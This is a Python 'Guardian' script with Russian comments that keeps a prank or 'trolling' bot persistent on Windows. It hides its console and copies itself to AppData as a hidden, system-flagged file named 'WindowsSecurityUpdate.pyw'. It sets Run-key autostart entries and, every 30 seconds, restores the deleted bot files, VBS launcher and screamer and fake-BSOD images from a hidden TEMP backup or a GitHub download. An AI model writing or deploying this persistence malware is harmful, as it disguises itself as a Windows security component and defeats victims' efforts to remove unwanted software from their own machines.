"""
Guardian - Защитник целостности бота
Следит за файлами в автозагрузке и AppData, восстанавливает их при удалении
"""

import os
import sys
import time
import shutil
import winreg
import zipfile
import tempfile
import requests
from pathlib import Path

# ============================================
# НАСТРОЙКА - ОБЯЗАТЕЛЬНО ИЗМЕНИТЕ!
# ============================================

# GitHub репозиторий для восстановления файлов
# ВАЖНО: Создайте ПРИВАТНЫЙ репозиторий и загрузите туда ВСЕ файлы!
# Формат: https://github.com/YOUR_USERNAME/YOUR_REPO/archive/refs/heads/main.zip
GITHUB_BACKUP_URL = "https://github.com/YOUR_USERNAME/YOUR_REPO/archive/refs/heads/main.zip"

# Если репозиторий ПРИВАТНЫЙ, используйте токен:
# GITHUB_BACKUP_URL = "https://TOKEN@github.com/YOUR_USERNAME/YOUR_REPO/archive/refs/heads/main.zip"
# Получить токен: github.com → Settings → Developer settings → Personal access tokens

CHECK_INTERVAL = 30  # Проверка каждые 30 секунд

# ============================================
# ПУТИ (менять НЕ нужно!)
# ============================================

APPDATA = os.environ.get('APPDATA')
PROGRAMS_DIR = os.path.join(APPDATA, 'Programs')
TEMP_DIR = os.environ.get('TEMP')
BACKUP_DIR = os.path.join(TEMP_DIR, '.sysbackup')

# Скрытое место для Guardian (в системной папке)
GUARDIAN_HIDDEN_PATH = os.path.join(APPDATA, 'Microsoft', 'Windows', 'SystemData', 'WindowsSecurityUpdate.pyw')
GUARDIAN_AUTOSTART_NAME = "WindowsSecurityUpdate"

# ============================================
# КРИТИЧЕСКИЕ ФАЙЛЫ (добавьте ваши!)
# ============================================

# Файлы которые должны существовать и будут восстанавливаться
REQUIRED_FILES = {
    # Основные Python скрипты
    'bot.py': os.path.join(PROGRAMS_DIR, 'bot.py'),
    'watchdog.py': os.path.join(PROGRAMS_DIR, 'watchdog.py'),
    'bot_hidden.vbs': os.path.join(PROGRAMS_DIR, 'bot_hidden.vbs'),
    
    # Медиа файлы (фото)
    'photo/screamer1.jpg': os.path.join(PROGRAMS_DIR, 'photo', 'screamer1.jpg'),
    'photo/screamer2.png': os.path.join(PROGRAMS_DIR, 'photo', 'screamer2.png'),
    'photo/zela.png': os.path.join(PROGRAMS_DIR, 'photo', 'zela.png'),
    'photo/bsod.jpg': os.path.join(PROGRAMS_DIR, 'photo', 'bsod.jpg'),
    
    # Аудио файлы
    'photo/zela1.mp3': os.path.join(PROGRAMS_DIR, 'photo', 'zela1.mp3'),
    
    # GIF файлы (добавьте все ваши GIF!)
    'photo/mosquitoes-13105_256.gif': os.path.join(PROGRAMS_DIR, 'photo', 'mosquitoes-13105_256.gif'),
    # Добавьте здесь другие GIF если есть:
    # 'photo/spider.gif': os.path.join(PROGRAMS_DIR, 'photo', 'spider.gif'),
    # 'photo/fly.gif': os.path.join(PROGRAMS_DIR, 'photo', 'fly.gif'),
}

# Автозагрузка
AUTOSTART_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
AUTOSTART_ENTRY_NAME = "SystemService"

def hide_console():
    """Скрывает окно консоли"""
    try:
        import ctypes
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        
        hWnd = kernel32.GetConsoleWindow()
        if hWnd:
            user32.ShowWindow(hWnd, 0)  # SW_HIDE
    except:
        pass

def check_file_exists(file_path):
    """Проверяет существование файла"""
    return os.path.exists(file_path) and os.path.isfile(file_path)

def check_directory_exists(dir_path):
    """Проверяет существование директории"""
    return os.path.exists(dir_path) and os.path.isdir(dir_path)

def check_autostart():
    """Проверяет наличие в автозагрузке"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTOSTART_KEY_PATH, 0, winreg.KEY_READ)
        try:
            value, _ = winreg.QueryValueEx(key, AUTOSTART_ENTRY_NAME)
            winreg.CloseKey(key)
            return True
        except:
            winreg.CloseKey(key)
            return False
    except:
        return False

def restore_autostart():
    """Восстанавливает запись в автозагрузке"""
    try:
        vbs_path = REQUIRED_FILES['bot_hidden.vbs']
        if not check_file_exists(vbs_path):
            print("⚠️ VBS файл не найден, не могу восстановить автозагрузку")
            return False
        
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTOSTART_KEY_PATH, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, AUTOSTART_ENTRY_NAME, 0, winreg.REG_SZ, vbs_path)
        winreg.CloseKey(key)
        print("✅ Автозагрузка восстановлена")
        return True
    except Exception as e:
        print(f"❌ Ошибка восстановления автозагрузки: {e}")
        return False

def create_backup_locally():
    """Создаёт локальную резервную копию в скрытом месте"""
    try:
        backup_dir = os.path.join(TEMP_DIR, '.sysbackup')
        os.makedirs(backup_dir, exist_ok=True)
        
        # Копируем все файлы
        for name, path in REQUIRED_FILES.items():
            if check_file_exists(path):
                backup_path = os.path.join(backup_dir, name)
                shutil.copy2(path, backup_path)
        
        # Копируем папку photo если есть
        photo_dir = os.path.join(PROGRAMS_DIR, 'photo')
        if check_directory_exists(photo_dir):
            backup_photo = os.path.join(backup_dir, 'photo')
            if os.path.exists(backup_photo):
                shutil.rmtree(backup_photo)
            shutil.copytree(photo_dir, backup_photo)
        
        print("✅ Локальная резервная копия создана")
        return True
    except Exception as e:
        print(f"❌ Ошибка создания бэкапа: {e}")
        return False

def restore_from_local_backup():
    """Восстанавливает файлы из локального бэкапа"""
    try:
        backup_dir = os.path.join(TEMP_DIR, '.sysbackup')
        if not check_directory_exists(backup_dir):
            return False
        
        # Создаём директорию если нужно
        os.makedirs(PROGRAMS_DIR, exist_ok=True)
        
        restored = []
        for name, path in REQUIRED_FILES.items():
            backup_path = os.path.join(backup_dir, name)
            if check_file_exists(backup_path):
                shutil.copy2(backup_path, path)
                restored.append(name)
        
        # Восстанавливаем photo
        backup_photo = os.path.join(backup_dir, 'photo')
        if check_directory_exists(backup_photo):
            photo_dir = os.path.join(PROGRAMS_DIR, 'photo')
            if os.path.exists(photo_dir):
                shutil.rmtree(photo_dir)
            shutil.copytree(backup_photo, photo_dir)
            restored.append('photo/')
        
        if restored:
            print(f"✅ Восстановлено из локального бэкапа: {', '.join(restored)}")
            return True
        return False
    except Exception as e:
        print(f"❌ Ошибка восстановления из бэкапа: {e}")
        return False

def download_and_restore_from_github():
    """Скачивает архив с GitHub и восстанавливает файлы"""
    try:
        print("📥 Скачиваю резервную копию с GitHub...")
        
        # Скачиваем ZIP
        response = requests.get(GITHUB_BACKUP_URL, stream=True, timeout=30)
        if response.status_code != 200:
            print(f"❌ Ошибка скачивания: HTTP {response.status_code}")
            return False
        
        # Сохраняем во временный файл
        zip_path = os.path.join(TEMP_DIR, 'bot_backup.zip')
        with open(zip_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        print("📦 Распаковываю архив...")
        
        # Распаковываем
        extract_dir = os.path.join(TEMP_DIR, 'bot_extract')
        if os.path.exists(extract_dir):
            shutil.rmtree(extract_dir)
        os.makedirs(extract_dir)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        # Находим корневую папку (обычно troling-bot-main или похожее)
        root_folder = None
        for item in os.listdir(extract_dir):
            item_path = os.path.join(extract_dir, item)
            if os.path.isdir(item_path):
                root_folder = item_path
                break
        
        if not root_folder:
            print("❌ Не найдена корневая папка в архиве")
            return False
        
        # Создаём директорию назначения
        os.makedirs(PROGRAMS_DIR, exist_ok=True)
        
        # Копируем файлы
        restored = []
        for name in REQUIRED_FILES.keys():
            source = os.path.join(root_folder, name)
            if os.path.exists(source):
                dest = REQUIRED_FILES[name]
                shutil.copy2(source, dest)
                restored.append(name)
        
        # Копируем photo
        source_photo = os.path.join(root_folder, 'photo')
        if os.path.exists(source_photo):
            dest_photo = os.path.join(PROGRAMS_DIR, 'photo')
            if os.path.exists(dest_photo):
                shutil.rmtree(dest_photo)
            shutil.copytree(source_photo, dest_photo)
            restored.append('photo/')
        
        # Очистка
        os.remove(zip_path)
        shutil.rmtree(extract_dir)
        
        print(f"✅ Восстановлено с GitHub: {', '.join(restored)}")
        return True
        
    except Exception as e:
        print(f"❌ Ошибка восстановления с GitHub: {e}")
        return False

def install_guardian():
    """Устанавливает Guardian в скрытое место и автозагрузку"""
    try:
        # Создаём скрытую директорию
        guardian_dir = os.path.dirname(GUARDIAN_HIDDEN_PATH)
        os.makedirs(guardian_dir, exist_ok=True)
        
        # Копируем себя в скрытое место (если ещё не там)
        current_file = os.path.abspath(__file__)
        if current_file != GUARDIAN_HIDDEN_PATH:
            shutil.copy2(current_file, GUARDIAN_HIDDEN_PATH)
            
            # Делаем файл скрытым и системным
            import ctypes
            FILE_ATTRIBUTE_HIDDEN = 0x02
            FILE_ATTRIBUTE_SYSTEM = 0x04
            ctypes.windll.kernel32.SetFileAttributesW(GUARDIAN_HIDDEN_PATH, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
            
            print(f"✅ Guardian установлен в {GUARDIAN_HIDDEN_PATH}")
        
        # Добавляем Guardian в автозагрузку
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTOSTART_KEY_PATH, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, GUARDIAN_AUTOSTART_NAME, 0, winreg.REG_SZ, f'pythonw.exe "{GUARDIAN_HIDDEN_PATH}"')
        winreg.CloseKey(key)
        
        print("✅ Guardian добавлен в автозагрузку")
        return True
        
    except Exception as e:
        print(f"❌ Ошибка установки Guardian: {e}")
        return False

def monitor_integrity():
    """Основной цикл мониторинга"""
    print("🛡️ Guardian запущен")
    print(f"📁 Защищаемая директория: {PROGRAMS_DIR}")
    print(f"⏱️ Интервал проверки: {CHECK_INTERVAL} сек")
    print("-" * 50)
    
    # Создаём локальный бэкап при старте
    create_backup_locally()
    
    while True:
        try:
            issues_found = []
            
            # Проверяем директорию
            if not check_directory_exists(PROGRAMS_DIR):
                issues_found.append("Директория Programs удалена")
                os.makedirs(PROGRAMS_DIR, exist_ok=True)
            
            # Проверяем файлы
            for name, path in REQUIRED_FILES.items():
                if not check_file_exists(path):
                    issues_found.append(f"Файл {name} удалён")
            
            # Проверяем автозагрузку
            if not check_autostart():
                issues_found.append("Запись в автозагрузке удалена")
            
            # Если есть проблемы - восстанавливаем
            if issues_found:
                print(f"\n⚠️ Обнаружены проблемы: {', '.join(issues_found)}")
                
                # Пробуем восстановить из локального бэкапа
                if restore_from_local_backup():
                    print("✅ Файлы восстановлены из локального бэкапа")
                else:
                    # Если не получилось - скачиваем с GitHub
                    print("📥 Попытка скачать с GitHub...")
                    if download_and_restore_from_github():
                        print("✅ Файлы восстановлены с GitHub")
                        # Создаём новый локальный бэкап
                        create_backup_locally()
                    else:
                        print("❌ Не удалось восстановить файлы")
                
                # Восстанавливаем автозагрузку
                restore_autostart()
                
                print("-" * 50)
            
            # Периодически обновляем локальный бэкап
            if int(time.time()) % 300 == 0:  # Каждые 5 минут
                create_backup_locally()
            
        except Exception as e:
            print(f"❌ Ошибка в цикле мониторинга: {e}")
        
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    # Скрываем консоль
    hide_console()
    
    # Устанавливаем Guardian если это первый запуск
    current_file = os.path.abspath(__file__)
    if current_file != GUARDIAN_HIDDEN_PATH:
        print("🔧 Первый запуск - устанавливаю Guardian...")
        install_guardian()
        print("✅ Установка завершена")
        print(f"🚀 Запускаю Guardian из скрытого места...")
        
        # Запускаем из нового места
        os.system(f'start /min pythonw.exe "{GUARDIAN_HIDDEN_PATH}"')
        sys.exit(0)
    
    # Основной цикл мониторинга
    try:
        monitor_integrity()
    except KeyboardInterrupt:
        print("\n🛑 Guardian остановлен пользователем")
    except Exception as e:
        print(f"\n❌ Критическая ошибка: {e}")
        # Перезапуск через 5 секунд
        time.sleep(5)
        os.system(f'start /min pythonw.exe "{GUARDIAN_HIDDEN_PATH}"')
